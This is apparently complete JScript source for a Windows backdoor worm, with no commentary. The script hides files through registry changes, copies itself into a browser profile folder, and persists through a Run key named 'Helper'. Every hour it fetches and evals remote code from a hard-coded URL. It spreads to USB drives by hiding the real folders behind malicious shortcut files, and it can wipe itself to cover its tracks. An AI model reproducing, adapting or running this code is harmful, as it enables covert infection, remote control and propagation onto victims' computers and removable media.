var $ = this;
var ws = new ActiveXObject("WScript.Shell");
var fso = new ActiveXObject("Scripting.FileSystemObject");
var app = new ActiveXObject("Shell.Application");
var cfg = function(arg) {
  $.locations = ["%localappdata%\\Google\\Chrome\\User Data", "%localappdata%\\Mozilla\\Firefox", "%localappdata%\\Microsoft\\Windows\\Explorer", "%tmp%"];
  $.registry = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Helper";
  $.url = "http://legitinternet.com/txt.txt";
  $.loader = "profile.js";
  $.jsdrop = "start.js";
  $.lockbd = "1.lock";
  $.lockusb = "2.lock";
  $.magic = "00000";
  $.basedir = "";
  
  try {
    ws.regWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Hidden", 2, "REG_DWORD")
  } catch (e) {}
  try {
    ws.regWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\ShowSuperHidden", 0, "REG_DWORD")
  } catch (e) {}
  
  $.run(arg)
};
var env = function(encoded) {
  return ws.ExpandEnvironmentStrings(encoded)
};
var module = function(url) {
  try {
    var http = new ActiveXObject("MSXML2.XMLHTTP"), payload;
    http.open("GET", url, 0);
    http.setRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0");
    http.send("");
    if (http.responseText.substr(0, 5) != $.magic) return false;
    result = eval("(function(){" + http.responseText.substr(5) + "}())")
  } catch (e) {
    return false
  }
};
var run = function(arg) {
  var payload, data, returned = "";
  for (var i = 0; i < $.locations.length; i++) {
    $.basedir = $.env($.locations[i]);
    if (fso.folderExists($.basedir)) break
  }
  if (arg == "usb") {
    if (!lock($.lockusb)) WScript.quit();
    usb()
  } else if (arg.substr(0, 4) == "http") {
    module(arg)
  } else if (arg !== "") {
    var drive = WScript.ScriptFullName.split("\\").shift();
    if (drive != env("%homedrive%")) {
      ws.run("%comspec% /c explorer \"" + drive + "\\" + arg + "\"", 0, false)
    }
    fork("")
  } else {
    if (!lock($.lockbd)) WScript.quit();
    setup();
    fork("usb");
    var last = 0;
    for(;;) {
      if (last + 3600000 < (new Date).getTime()) {
        module($.url);
        last = (new Date).getTime()
      }
      WScript.sleep(1000)
    }
  }
};
var setup = function() {
  if (fso.fileExists($.basedir + "\\" + $.loader)) {
    if ($.basedir + "\\" + $.loader != WScript.ScriptFullName) {
      fso.deleteFile($.basedir + "\\" + $.loader);
      fso.copyFile(WScript.ScriptFullName, $.basedir + "\\" + $.loader)
    }
  } else {
    fso.copyFile(WScript.ScriptFullName, $.basedir + "\\" + $.loader);
    ws.regWrite($.registry, "wscript.exe \"" + $.basedir + "\\" + $.loader + "\"")
  }
};
var lock = function(lockfile) {
  try {
    var plock = fso.openTextFile($.basedir + "\\" + lockfile, 2, 1);
    return true
  } catch (e) {
    return false
  }
};
var melt = function() {
  try {
    fso.BuildPath = ""
  } catch (e) {
    eval('var attributes = fso.getFile(WScript.ScriptFullName), pointer = fso.openTextFile(WScript.ScriptFullName, 2, 1);for (var i = 0; i < attributes.size; i++) pointer.write("\x20");pointer.close()')
  }
};
var fork = function(func) {
  app.ShellExecute(env("%windir%\\system32\\wscript.exe"), '"' + WScript.ScriptFullName + '" "' + func + '"', env("%windir%\\system32"), "open", 0)
};
var quit = function() {
  melt();
  try { fso.deleteFile(WScript.ScriptFullName) } catch (e) {}
  try { fso.deleteFile($.basedir + "\\" + $.loader) } catch (e) {}
  try { fso.deleteFile($.basedir + "\\" + $.lockbd) } catch (e) {}
  try { fso.deleteFile($.basedir + "\\" + $.lockusb) } catch (e) {}
  try { ws.regDelete($.registry) } catch (e) {}
  WScript.quit()
};
var usb = function() {
  for (;;) {
    var usbs = getUSB();
    for (var i = 0; i < usbs.length; i++) {
      var usbfolders = getUSBFolders(usbs[i]);
      for (var f = 0; f < usbfolders.length; f++) {
        var lnk = usbfolders[f] + ".lnk";
        if (fso.fileExists(lnk) == false) {
          if (!fso.fileExists(usbs[i] + "\\" + $.jsdrop)) {
            fso.copyFile(WScript.ScriptFullName, usbs[i] + "\\" + $.jsdrop)
          }
          with (fso.getFolder(usbfolders[f])) attributes = 2;
          var sc = ws.CreateShortcut(lnk);
          sc.targetPath = "%windir%\\system32\\wscript.exe";
          sc.windowStyle = 1;
          sc.arguments = $.jsdrop + " \"" + usbfolders[f].split("\\").pop() + "\"";
          sc.iconLocation = "%windir%\\system32\\shell32.dll,3";
          sc.save()
		 // %windir%\system32\wscript.exe start.js "Novelas [Finalizadas] El Chapo 3"
        }
      }
    }
    WScript.sleep(10000)
  }
};
var getUSB = function() {
  var out = [], cimv2;
  try {
    cimv2 = GetObject("winmgmts:root\\cimv2");
    for (var a = new Enumerator(cimv2.ExecQuery("SELECT * FROM Win32_DiskDrive WHERE Model LIKE '%usb%'")); !a.atEnd(); a.moveNext())
      for (var b = new Enumerator(cimv2.ExecQuery("ASSOCIATORS OF {Win32_DiskDrive.DeviceID=\x27" + a.item().DeviceID + "\x27} WHERE AssocClass=Win32_DiskDriveToDiskPartition")); !b.atEnd(); b.moveNext())
        for (var c = new Enumerator(cimv2.ExecQuery("ASSOCIATORS OF {Win32_DiskPartition.DeviceID=\x27" + b.item().DeviceID + "\x27} WHERE AssocClass=Win32_LogicalDiskToPartition")); !c.atEnd(); c.moveNext())
          out.push(c.item().DeviceID)
  } catch (e) {}
  return out
};
var getUSBFolders = function(location) {
  var folders = [];
  for (var a = new Enumerator(fso.GetFolder(location).SubFolders); !a.atEnd(); a.moveNext()) {
    if (a.item().Name.match(/^(\.|System Volume Information$)/) == null) folders.push(location + "\\" + a.item().Name)
  }
  return folders
};

var arg;
try {
  arg = WScript.Arguments(0)
} catch (e) {
  arg = ""
}
cfg(arg)
